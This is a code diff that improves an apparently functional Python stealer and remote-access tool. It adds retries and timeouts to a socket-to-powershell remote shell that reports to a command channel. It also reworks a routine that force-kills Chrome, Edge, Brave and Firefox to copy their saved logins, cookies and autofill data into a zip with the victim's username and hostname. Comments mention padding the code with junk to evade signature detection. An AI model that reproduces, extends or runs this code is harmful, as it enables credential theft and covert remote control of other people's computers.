@@ -34,6 +34,41 @@ from datetime import datetime
 from cryptography.fernet import Fernet
 from win32com.client import Dispatch
 
+# Verify file integrity at startup
+def verify_file_integrity():
+    try:
+        # Get the size of the current file
+        current_file = os.path.abspath(sys.argv[0])
+        if not current_file.endswith('.py') and os.path.exists(current_file):
+            # We're running as compiled executable, no need to check
+            return True
+            
+        # If we're running as a Python script, check file size
+        script_size = os.path.getsize(current_file)
+        min_expected_size = 30000  # Minimum expected size in bytes (30KB)
+        
+        if script_size < min_expected_size:
+            print(f"Warning: Current file appears to be truncated ({script_size} bytes)")
+            
+            # Check if main.py exists as a fallback
+            main_py = os.path.join(os.path.dirname(current_file), "main.py")
+            if os.path.exists(main_py) and os.path.getsize(main_py) > script_size:
+                print(f"Found main.py with larger size ({os.path.getsize(main_py)} bytes), using as fallback")
+                
+                # Execute main.py instead
+                subprocess.Popen([sys.executable, main_py], 
+                                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                                 start_new_session=True)
+                sys.exit(0)  # Exit current process
+                
+        return True
+    except Exception as e:
+        print(f"Error verifying file integrity: {str(e)}")
+        return True  # Continue execution even if verification fails
+
+# Run integrity check at startup
+verify_file_integrity()
+
 # Adding some junk code to avoid signature detection
 _random_str = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(10, 20)))
 _junk_data = [random.randint(1000, 9999) for _ in range(random.randint(5, 15))]
@@ -403,6 +438,7 @@ async def steal_user_info():
             pass
 
 async def start_reverse_shell(port=0):
+    server = None
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -431,44 +467,85 @@ async def start_reverse_shell(port=0):
                 )
                 ip = ip_response.text.strip()
             except:
-                # Use fallback if all services fail
                 try:
-                    # Try to get the local IP as a last resort
-                    hostname = socket.gethostname()
-                    ip = socket.gethostbyname(hostname)
+                    # Try third service if second fails
+                    ip_response = await asyncio.wait_for(
+                        asyncio.to_thread(requests.get, 'https://checkip.amazonaws.com/', timeout=3),
+                        timeout=5
+                    )
+                    ip = ip_response.text.strip()
                 except:
-                    pass  # Keep default 127.0.0.1
+                    # Use fallback if all services fail
+                    try:
+                        # Try to get the local IP as a last resort
+                        hostname = socket.gethostname()
+                        ip = socket.gethostbyname(hostname)
+                    except:
+                        pass  # Keep default 127.0.0.1
                     
         return server, ip, port
     except Exception as e:
         print(f"Error starting reverse shell: {str(e)}")
+        # Clean up server socket if creation failed
+        if server:
+            try:
+                server.close()
+            except:
+                pass
         return None, None, None
 
 async def handle_client(client_socket, channel):
-    # Set socket timeout
-    client_socket.settimeout(300)  # 5 minute timeout for socket operations
-    
-    # Set up shell based on OS
-    shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
-    shell_args = [] if os.name == 'nt' else ['-i']
+    shell = None
+    s2s_task = None
+    s2c_task = None
     
     try:
-        # Start subprocess with timeouts
-        shell = await asyncio.wait_for(
-            asyncio.create_subprocess_exec(
-                shell_cmd, *shell_args,
-                stdin=asyncio.subprocess.PIPE,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            ),
-            timeout=10  # 10 second timeout for process creation
-        )
+        # Set socket timeout
+        client_socket.settimeout(300)  # 5 minute timeout for socket operations
+        
+        # Set up shell based on OS
+        shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
+        shell_args = [] if os.name == 'nt' else ['-i']
+        
+        # Start subprocess with timeouts and retry logic
+        retry_count = 0
+        max_retries = 3
+        
+        while retry_count < max_retries:
+            try:
+                shell = await asyncio.wait_for(
+                    asyncio.create_subprocess_exec(
+                        shell_cmd, *shell_args,
+                        stdin=asyncio.subprocess.PIPE,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
+                    ),
+                    timeout=10  # 10 second timeout for process creation
+                )
+                break  # Success, exit retry loop
+            except asyncio.TimeoutError:
+                retry_count += 1
+                if retry_count >= max_retries:
+                    if channel:
+                        await channel.send(f"[!] Failed to start shell process after {max_retries} attempts")
+                    return
+                await asyncio.sleep(1)  # Short delay before retry
+            except Exception as e:
+                if channel:
+                    await channel.send(f"[!] Error creating shell process: {str(e)}")
+                return
+        
+        if channel:
+            await channel.send(f"[+] Shell session established")
         
         # Task to handle socket-to-shell communication
         async def socket_to_shell():
             try:
                 read_buffer = b''
+                idle_count = 0
+                max_idle_count = 5  # After 5 idle periods (5 minutes), send heartbeat
+                
                 while True:
                     try:
                         # Read data with timeout
@@ -476,6 +553,8 @@ async def handle_client(client_socket, channel):
                             asyncio.to_thread(client_socket.recv, 4096),
                             timeout=60  # 60 second timeout for each receive
                         )
+                        idle_count = 0  # Reset idle counter on successful data receipt
+                        
                         if not chunk:
                             break
                             
@@ -488,14 +567,34 @@ async def handle_client(client_socket, channel):
                             read_buffer = lines[-1]
                             # Process all complete lines
                             for line in lines[:-1]:
-                                if shell.stdin:
-                                    shell.stdin.write(line + b'\n')
-                                    await shell.stdin.drain()
+                                if shell and shell.stdin:
+                                    try:
+                                        shell.stdin.write(line + b'\n')
+                                        await asyncio.wait_for(shell.stdin.drain(), timeout=5)
+                                    except (asyncio.TimeoutError, BrokenPipeError):
+                                        if channel:
+                                            await channel.send("[!] Shell input pipe broken or timed out")
+                                        return
                     except asyncio.TimeoutError:
-                        # Send a heartbeat to keep connection alive
-                        if channel:
-                            await channel.send("[*] Shell connection idle for 60 seconds")
+                        # Count idle periods
+                        idle_count += 1
+                        if idle_count >= max_idle_count:
+                            # Send a heartbeat to keep connection alive
+                            if channel:
+                                await channel.send("[*] Shell connection idle for 5 minutes, sending heartbeat")
+                            try:
+                                # Send a benign command to keep the shell alive
+                                if shell and shell.stdin:
+                                    shell.stdin.write(b'echo heartbeat\n')
+                                    await asyncio.wait_for(shell.stdin.drain(), timeout=5)
+                            except:
+                                pass
+                            idle_count = 0
                         continue
+                    except ConnectionResetError:
+                        if channel:
+                            await channel.send("[!] Connection reset by client")
+                        break
                     except Exception as e:
                         if channel:
                             await channel.send(f"[!] Socket-to-shell error: {str(e)}")
@@ -505,25 +604,65 @@ async def handle_client(client_socket, channel):
                     await channel.send(f"[!] Socket-to-shell outer error: {str(outer_e)}")
             finally:
                 # Ensure stdin is closed
-                if shell.stdin:
-                    shell.stdin.close()
+                if shell and shell.stdin:
+                    try:
+                        shell.stdin.close()
+                    except:
+                        pass
         
         # Task to handle shell-to-socket communication
         async def shell_to_socket():
             try:
+                no_output_count = 0
+                max_no_output = 10  # After 10 minutes of no output, check if process is still alive
+                
                 while True:
                     try:
+                        # Check if shell process is still running
+                        if shell.returncode is not None:
+                            if channel:
+                                await channel.send(f"[!] Shell process terminated with code {shell.returncode}")
+                            break
+                            
                         # Read output from shell with timeout
                         output = await asyncio.wait_for(shell.stdout.readline(), timeout=60)
+                        no_output_count = 0  # Reset counter on successful read
+                        
                         if not output:
-                            error = await asyncio.wait_for(shell.stderr.readline(), timeout=5)
-                            if not error:
+                            try:
+                                error = await asyncio.wait_for(shell.stderr.readline(), timeout=5)
+                                if not error:
+                                    # Both stdout and stderr returned nothing, which could indicate EOF
+                                    if shell.returncode is not None:
+                                        break
+                                await asyncio.to_thread(client_socket.send, error)
+                            except:
+                                # If we can't read from stderr either, break the loop
                                 break
-                            await asyncio.to_thread(client_socket.send, error)
                         else:
-                            await asyncio.to_thread(client_socket.send, output)
+                            try:
+                                await asyncio.wait_for(
+                                    asyncio.to_thread(client_socket.send, output),
+                                    timeout=5
+                                )
+                            except asyncio.TimeoutError:
+                                if channel:
+                                    await channel.send("[!] Socket send timed out")
+                                break
+                            except ConnectionResetError:
+                                if channel:
+                                    await channel.send("[!] Connection reset while sending data")
+                                break
                     except asyncio.TimeoutError:
-                        # No output for 60 seconds, but keep running
+                        # No output for 60 seconds
+                        no_output_count += 1
+                        if no_output_count >= max_no_output:
+                            # After 10 minutes of no output, check if process is still alive
+                            if shell.returncode is not None:
+                                if channel:
+                                    await channel.send(f"[!] Shell process terminated with code {shell.returncode}")
+                                break
+                            no_output_count = 0  # Reset counter
                         continue
                     except Exception as e:
                         if channel:
@@ -537,6 +676,12 @@ async def handle_client(client_socket, channel):
                 try:
                     if shell and shell.returncode is None:
                         shell.terminate()
+                        try:
+                            # Wait briefly for termination
+                            await asyncio.wait_for(shell.wait(), timeout=5)
+                        except asyncio.TimeoutError:
+                            # Force kill if termination takes too long
+                            shell.kill()
                 except:
                     pass
         
@@ -553,6 +698,10 @@ async def handle_client(client_socket, channel):
         # Cancel pending tasks
         for task in pending:
             task.cancel()
+            try:
+                await asyncio.wait_for(task, timeout=5)
+            except:
+                pass
             
         if channel:
             await channel.send("[*] Remote shell connection closed")
@@ -563,13 +712,25 @@ async def handle_client(client_socket, channel):
     finally:
         # Clean up resources
         try:
+            # Cancel tasks if still running
+            if s2s_task and not s2s_task.done():
+                s2s_task.cancel()
+            if s2c_task and not s2c_task.done():
+                s2c_task.cancel()
+                
+            # Close socket
             client_socket.close()
-        except:
-            pass
-        
-        try:
+            
+            # Terminate shell process if still running
             if shell and shell.returncode is None:
-                shell.terminate()
+                try:
+                    shell.terminate()
+                    await asyncio.wait_for(shell.wait(), timeout=2)
+                except:
+                    try:
+                        shell.kill()
+                    except:
+                        pass
         except:
             pass
 
@@ -1590,205 +1751,292 @@ async def steal_browser_data():
         
         stolen_data = {}
         max_browser_processing_time = 30  # Maximum seconds to spend on each browser
+        total_start_time = time.time()
+        max_total_time = 120  # Maximum 2 minutes for entire operation
         
-        for browser_name, browser_path in browsers.items():
-            # Skip non-existent browser paths
-            if not await asyncio.to_thread(os.path.exists, browser_path):
-                continue
-                
-            stolen_data[browser_name] = {}
-            browser_start_time = time.time()
-            
-            if browser_name in ['chrome', 'edge', 'brave']:
-                # Find profiles for Chrome-based browsers
-                profiles = []
+        # Set up global timeout for entire operation
+        try:
+            for browser_name, browser_path in browsers.items():
+                # Check if we've exceeded total time limit
+                if time.time() - total_start_time > max_total_time:
+                    stolen_data["timeout"] = "Total operation timed out"
+                    break
+                    
+                # Skip non-existent browser paths
                 try:
-                    if await asyncio.to_thread(os.path.exists, browser_path):
-                        items = await asyncio.to_thread(os.listdir, browser_path)
-                        for item in items:
-                            if item.startswith('Profile ') or item == 'Default':
-                                profiles.append(item)
-                except Exception as e:
-                    stolen_data[browser_name]["error"] = f"Error listing profiles: {str(e)}"
+                    if not await asyncio.wait_for(
+                        asyncio.to_thread(os.path.exists, browser_path),
+                        timeout=2
+                    ):
+                        continue
+                except asyncio.TimeoutError:
                     continue
+                    
+                stolen_data[browser_name] = {}
+                browser_start_time = time.time()
                 
-                # Cap number of profiles to avoid processing too many
-                if len(profiles) > 5:
-                    profiles = profiles[:5]  # Only process first 5 profiles
-                
-                for profile in profiles:
-                    # Check time spent on this browser to avoid getting stuck
-                    if time.time() - browser_start_time > max_browser_processing_time:
-                        stolen_data[browser_name]["timeout"] = "Browser processing timed out"
-                        break
-                        
-                    profile_path = os.path.join(browser_path, profile)
+                if browser_name in ['chrome', 'edge', 'brave']:
+                    # Find profiles for Chrome-based browsers
+                    profiles = []
+                    try:
+                        if await asyncio.wait_for(
+                            asyncio.to_thread(os.path.exists, browser_path),
+                            timeout=2
+                        ):
+                            items = await asyncio.wait_for(
+                                asyncio.to_thread(os.listdir, browser_path),
+                                timeout=3
+                            )
+                            for item in items:
+                                if item.startswith('Profile ') or item == 'Default':
+                                    profiles.append(item)
+                    except (asyncio.TimeoutError, Exception) as e:
+                        stolen_data[browser_name]["error"] = f"Error listing profiles: {str(e)}"
+                        continue
                     
-                    # Process login data (credentials)
-                    login_db = os.path.join(profile_path, 'Login Data')
-                    if await asyncio.to_thread(os.path.exists, login_db):
-                        login_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_logins.db")
-                        try:
-                            # Kill browser process to unlock database files
-                            await asyncio.to_thread(subprocess.run, 
-                                               ['taskkill', '/F', '/IM', f"{browser_name}.exe"], 
-                                               shell=True, 
-                                               stdout=subprocess.DEVNULL,
-                                               stderr=subprocess.DEVNULL,
-                                               check=False,
-                                               timeout=5)  # Add timeout to avoid hanging
-                            await asyncio.sleep(0.5)
-                            
-                            # Copy the file with timeout protection
-                            try:
-                                await asyncio.wait_for(
-                                    asyncio.to_thread(shutil.copy2, login_db, login_copy),
-                                    timeout=5
-                                )
-                                stolen_data[browser_name][f"{profile}_logins"] = "Extracted"
-                            except asyncio.TimeoutError:
-                                stolen_data[browser_name][f"{profile}_logins"] = "Timeout during copy"
-                        except Exception as e:
-                            stolen_data[browser_name][f"{profile}_logins"] = f"Failed: {str(e)}"
+                    # Cap number of profiles to avoid processing too many
+                    if len(profiles) > 3:  # Reduced from 5 to 3 for better performance
+                        profiles = profiles[:3]
                     
-                    # Process cookies
-                    cookies_db = os.path.join(profile_path, 'Network', 'Cookies')
-                    if await asyncio.to_thread(os.path.exists, cookies_db):
-                        cookies_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_cookies.db")
-                        try:
-                            # Copy the file with timeout protection
-                            try:
-                                await asyncio.wait_for(
-                                    asyncio.to_thread(shutil.copy2, cookies_db, cookies_copy),
-                                    timeout=5
-                                )
-                                stolen_data[browser_name][f"{profile}_cookies"] = "Extracted"
-                            except asyncio.TimeoutError:
-                                stolen_data[browser_name][f"{profile}_cookies"] = "Timeout during copy"
-                        except Exception as e:
-                            stolen_data[browser_name][f"{profile}_cookies"] = f"Failed: {str(e)}"
-                            
-                    # Process web data (autofill)
-                    webdata_db = os.path.join(profile_path, 'Web Data')
-                    if await asyncio.to_thread(os.path.exists, webdata_db):
-                        webdata_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_webdata.db")
-                        try:
-                            # Copy the file with timeout protection
-                            try:
-                                await asyncio.wait_for(
-                                    asyncio.to_thread(shutil.copy2, webdata_db, webdata_copy),
-                                    timeout=5
-                                )
-                                stolen_data[browser_name][f"{profile}_autofill"] = "Extracted"
-                            except asyncio.TimeoutError:
-                                stolen_data[browser_name][f"{profile}_autofill"] = "Timeout during copy"
-                        except Exception as e:
-                            stolen_data[browser_name][f"{profile}_autofill"] = f"Failed: {str(e)}"
-            
-            # Process Firefox
-            elif browser_name == 'firefox' and await asyncio.to_thread(os.path.exists, browser_path):
-                try:
-                    items = await asyncio.to_thread(os.listdir, browser_path)
-                    firefox_processed = False
-                    
-                    for item in items:
+                    for profile in profiles:
                         # Check time spent on this browser to avoid getting stuck
                         if time.time() - browser_start_time > max_browser_processing_time:
                             stolen_data[browser_name]["timeout"] = "Browser processing timed out"
                             break
                             
-                        item_path = os.path.join(browser_path, item)
-                        if (await asyncio.to_thread(os.path.isdir, item_path) and 
-                            ('.default' in item or 'default-release' in item)):
-                            profile_path = item_path
+                        # Check total time spent
+                        if time.time() - total_start_time > max_total_time:
+                            stolen_data["timeout"] = "Total operation timed out during profile processing"
+                            return temp_dir, json.dumps(stolen_data, indent=2)
                             
-                            # Kill Firefox to unlock files
-                            await asyncio.to_thread(subprocess.run, 
-                                               ['taskkill', '/F', '/IM', 'firefox.exe'], 
-                                               shell=True, 
-                                               stdout=subprocess.DEVNULL,
-                                               stderr=subprocess.DEVNULL,
-                                               check=False,
-                                               timeout=5)
-                            await asyncio.sleep(0.5)
-                            
-                            # Process cookies
-                            cookies_file = os.path.join(profile_path, 'cookies.sqlite')
-                            if await asyncio.to_thread(os.path.exists, cookies_file):
-                                cookies_copy = os.path.join(temp_dir, "firefox_cookies.sqlite")
+                        profile_path = os.path.join(browser_path, profile)
+                        
+                        # Process login data (credentials)
+                        login_db = os.path.join(profile_path, 'Login Data')
+                        try:
+                            login_exists = await asyncio.wait_for(
+                                asyncio.to_thread(os.path.exists, login_db),
+                                timeout=2
+                            )
+                            if login_exists:
+                                login_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_logins.db")
                                 try:
-                                    # Copy with timeout protection
+                                    # Kill browser process to unlock database files - with timeout
                                     try:
                                         await asyncio.wait_for(
-                                            asyncio.to_thread(shutil.copy2, cookies_file, cookies_copy),
-                                            timeout=5
+                                            asyncio.to_thread(
+                                                subprocess.run, 
+                                                ['taskkill', '/F', '/IM', f"{browser_name}.exe"], 
+                                                shell=True, 
+                                                stdout=subprocess.DEVNULL,
+                                                stderr=subprocess.DEVNULL,
+                                                check=False
+                                            ),
+                                            timeout=3
                                         )
-                                        stolen_data[browser_name]["cookies"] = "Extracted"
+                                        await asyncio.sleep(0.2)  # Reduced sleep time
                                     except asyncio.TimeoutError:
-                                        stolen_data[browser_name]["cookies"] = "Timeout during copy"
-                                except Exception:
-                                    stolen_data[browser_name]["cookies"] = "Failed"
-                            
-                            # Process logins
-                            logins_file = os.path.join(profile_path, 'logins.json')
-                            if await asyncio.to_thread(os.path.exists, logins_file):
-                                logins_copy = os.path.join(temp_dir, "firefox_logins.json")
-                                try:
-                                    # Copy with timeout protection
-                                    try:
-                                        await asyncio.wait_for(
-                                            asyncio.to_thread(shutil.copy2, logins_file, logins_copy),
-                                            timeout=5
-                                        )
-                                        stolen_data[browser_name]["logins"] = "Extracted"
-                                    except asyncio.TimeoutError:
-                                        stolen_data[browser_name]["logins"] = "Timeout during copy"
-                                except Exception:
-                                    stolen_data[browser_name]["logins"] = "Failed"
+                                        pass  # Continue even if kill times out
                                     
-                            firefox_processed = True
-                            break  # Only process one Firefox profile
-                    
-                    if not firefox_processed:
-                        stolen_data[browser_name]["error"] = "No suitable Firefox profile found"
-                except Exception as e:
-                    stolen_data[browser_name]["error"] = f"Error processing Firefox: {str(e)}"
-        
-        # Calculate summary statistics
-        stolen_data_count = 0
-        for browser in stolen_data:
-            for key in stolen_data[browser]:
-                if stolen_data[browser][key] == "Extracted":
-                    stolen_data_count += 1
-        
-        stolen_data["summary"] = {
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "total_items": stolen_data_count,
-            "user": os.getlogin(),
-            "hostname": socket.gethostname()
-        }
-        
-        # Create zip file with all stolen data
-        zip_path = os.path.join(os.environ['TEMP'], f"browser_data_{random.randint(1000, 9999)}.zip")
-        try:
-            await asyncio.wait_for(
-                asyncio.to_thread(create_zip, temp_dir, zip_path),
-                timeout=30  # Max 30 seconds for zip creation
-            )
-        except asyncio.TimeoutError:
-            return None, "Timeout while creating zip file"
-        
-        # Clean up temp directory
-        try:
-            await asyncio.wait_for(
-                asyncio.to_thread(shutil.rmtree, temp_dir, ignore_errors=True),
-                timeout=5
-            )
-        except:
-            pass
+                                    # Copy the file with timeout protection
+                                    try:
+                                        await asyncio.wait_for(
+                                            asyncio.to_thread(shutil.copy2, login_db, login_copy),
+                                            timeout=3
+                                        )
+                                        stolen_data[browser_name][f"{profile}_logins"] = "Extracted"
+                                    except asyncio.TimeoutError:
+                                        stolen_data[browser_name][f"{profile}_logins"] = "Timeout during copy"
+                                except Exception as e:
+                                    stolen_data[browser_name][f"{profile}_logins"] = f"Failed: {str(e)}"
+                        except asyncio.TimeoutError:
+                            stolen_data[browser_name][f"{profile}_logins"] = "Timeout checking file"
+                        
+                        # Process cookies - with timeout protection
+                        try:
+                            cookies_db = os.path.join(profile_path, 'Network', 'Cookies')
+                            cookies_exists = await asyncio.wait_for(
+                                asyncio.to_thread(os.path.exists, cookies_db),
+                                timeout=2
+                            )
+                            if cookies_exists:
+                                cookies_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_cookies.db")
+                                try:
+                                    # Copy the file with timeout protection
+                                    await asyncio.wait_for(
+                                        asyncio.to_thread(shutil.copy2, cookies_db, cookies_copy),
+                                        timeout=3
+                                    )
+                                    stolen_data[browser_name][f"{profile}_cookies"] = "Extracted"
+                                except (asyncio.TimeoutError, Exception) as e:
+                                    stolen_data[browser_name][f"{profile}_cookies"] = f"Failed: {str(e)}"
+                        except asyncio.TimeoutError:
+                            stolen_data[browser_name][f"{profile}_cookies"] = "Timeout checking file"
+                                
+                        # Process web data (autofill) - with timeout protection
+                        try:
+                            webdata_db = os.path.join(profile_path, 'Web Data')
+                            webdata_exists = await asyncio.wait_for(
+                                asyncio.to_thread(os.path.exists, webdata_db),
+                                timeout=2
+                            )
+                            if webdata_exists:
+                                webdata_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_webdata.db")
+                                try:
+                                    # Copy the file with timeout protection
+                                    await asyncio.wait_for(
+                                        asyncio.to_thread(shutil.copy2, webdata_db, webdata_copy),
+                                        timeout=3
+                                    )
+                                    stolen_data[browser_name][f"{profile}_autofill"] = "Extracted"
+                                except (asyncio.TimeoutError, Exception) as e:
+                                    stolen_data[browser_name][f"{profile}_autofill"] = f"Failed: {str(e)}"
+                        except asyncio.TimeoutError:
+                            stolen_data[browser_name][f"{profile}_autofill"] = "Timeout checking file"
+                
+                # Process Firefox - with timeout protection
+                elif browser_name == 'firefox':
+                    try:
+                        firefox_exists = await asyncio.wait_for(
+                            asyncio.to_thread(os.path.exists, browser_path),
+                            timeout=2
+                        )
+                        if firefox_exists:
+                            items = await asyncio.wait_for(
+                                asyncio.to_thread(os.listdir, browser_path),
+                                timeout=3
+                            )
+                            firefox_processed = False
+                            
+                            for item in items:
+                                # Check time spent on this browser to avoid getting stuck
+                                if time.time() - browser_start_time > max_browser_processing_time:
+                                    stolen_data[browser_name]["timeout"] = "Browser processing timed out"
+                                    break
+                                    
+                                # Check total time spent
+                                if time.time() - total_start_time > max_total_time:
+                                    stolen_data["timeout"] = "Total operation timed out during Firefox processing"
+                                    break
+                                    
+                                try:
+                                    item_path = os.path.join(browser_path, item)
+                                    is_dir = await asyncio.wait_for(
+                                        asyncio.to_thread(os.path.isdir, item_path),
+                                        timeout=2
+                                    )
+                                    if is_dir and ('.default' in item or 'default-release' in item):
+                                        profile_path = item_path
+                                        
+                                        # Kill Firefox to unlock files - with timeout
+                                        try:
+                                            await asyncio.wait_for(
+                                                asyncio.to_thread(
+                                                    subprocess.run, 
+                                                    ['taskkill', '/F', '/IM', 'firefox.exe'], 
+                                                    shell=True, 
+                                                    stdout=subprocess.DEVNULL,
+                                                    stderr=subprocess.DEVNULL,
+                                                    check=False
+                                                ),
+                                                timeout=3
+                                            )
+                                            await asyncio.sleep(0.2)  # Reduced sleep time
+                                        except asyncio.TimeoutError:
+                                            pass  # Continue even if kill times out
+                                        
+                                        # Process cookies - with timeout protection
+                                        try:
+                                            cookies_file = os.path.join(profile_path, 'cookies.sqlite')
+                                            cookies_exists = await asyncio.wait_for(
+                                                asyncio.to_thread(os.path.exists, cookies_file),
+                                                timeout=2
+                                            )
+                                            if cookies_exists:
+                                                cookies_copy = os.path.join(temp_dir, "firefox_cookies.sqlite")
+                                                try:
+                                                    # Copy with timeout protection
+                                                    await asyncio.wait_for(
+                                                        asyncio.to_thread(shutil.copy2, cookies_file, cookies_copy),
+                                                        timeout=3
+                                                    )
+                                                    stolen_data[browser_name]["cookies"] = "Extracted"
+                                                except (asyncio.TimeoutError, Exception):
+                                                    stolen_data[browser_name]["cookies"] = "Failed"
+                                        except asyncio.TimeoutError:
+                                            stolen_data[browser_name]["cookies"] = "Timeout checking file"
+                                        
+                                        # Process logins - with timeout protection
+                                        try:
+                                            logins_file = os.path.join(profile_path, 'logins.json')
+                                            logins_exists = await asyncio.wait_for(
+                                                asyncio.to_thread(os.path.exists, logins_file),
+                                                timeout=2
+                                            )
+                                            if logins_exists:
+                                                logins_copy = os.path.join(temp_dir, "firefox_logins.json")
+                                                try:
+                                                    # Copy with timeout protection
+                                                    await asyncio.wait_for(
+                                                        asyncio.to_thread(shutil.copy2, logins_file, logins_copy),
+                                                        timeout=3
+                                                    )
+                                                    stolen_data[browser_name]["logins"] = "Extracted"
+                                                except (asyncio.TimeoutError, Exception):
+                                                    stolen_data[browser_name]["logins"] = "Failed"
+                                        except asyncio.TimeoutError:
+                                            stolen_data[browser_name]["logins"] = "Timeout checking file"
+                                                
+                                        firefox_processed = True
+                                        break  # Only process one Firefox profile
+                                except (asyncio.TimeoutError, Exception):
+                                    continue
+                            
+                            if not firefox_processed:
+                                stolen_data[browser_name]["error"] = "No suitable Firefox profile found"
+                    except (asyncio.TimeoutError, Exception) as e:
+                        stolen_data[browser_name]["error"] = f"Error processing Firefox: {str(e)}"
             
-        return zip_path, json.dumps(stolen_data, indent=2)
-        
+            # Calculate summary statistics
+            stolen_data_count = 0
+            for browser in stolen_data:
+                if browser not in ["summary", "timeout"]:
+                    for key in stolen_data[browser]:
+                        if stolen_data[browser][key] == "Extracted":
+                            stolen_data_count += 1
+            
+            stolen_data["summary"] = {
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "total_items": stolen_data_count,
+                "user": os.getlogin(),
+                "hostname": socket.gethostname(),
+                "total_time": f"{time.time() - total_start_time:.2f} seconds"
+            }
+            
+            # Create zip file with all stolen data - with timeout protection
+            zip_path = os.path.join(os.environ['TEMP'], f"browser_data_{random.randint(1000, 9999)}.zip")
+            try:
+                await asyncio.wait_for(
+                    asyncio.to_thread(create_zip, temp_dir, zip_path),
+                    timeout=20  # Reduced from 30 to 20 seconds for zip creation
+                )
+            except asyncio.TimeoutError:
+                return None, "Timeout while creating zip file"
+            
+            # Clean up temp directory - with timeout protection
+            try:
+                await asyncio.wait_for(
+                    asyncio.to_thread(shutil.rmtree, temp_dir, ignore_errors=True),
+                    timeout=3
+                )
+            except (asyncio.TimeoutError, Exception):
+                pass  # Ignore cleanup errors
+                
+            return zip_path, json.dumps(stolen_data, indent=2)
+            
+        except asyncio.TimeoutError:
+            return None, "Global timeout during browser data extraction"
+            
     except Exception as e:
         return None, str(e)
 
